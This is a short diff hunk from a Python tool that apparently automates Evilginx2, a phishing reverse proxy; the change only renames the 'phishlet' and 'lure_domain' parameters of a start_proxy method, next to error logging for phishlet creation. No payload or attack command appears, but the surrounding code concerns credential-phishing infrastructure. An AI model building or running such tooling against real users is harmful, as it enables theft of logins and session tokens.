@@ -98,7 +98,7 @@ login:
             logger.error(f"Failed to create phishlet: {e}")
             return ""
             
-    def start_proxy(self, phishlet: str, lure_domain: str) -> bool:
+    def start_proxy(self, _phishlet: str, _lure_domain: str) -> bool:
         """
         Start Evilginx2 in background mode.
         """
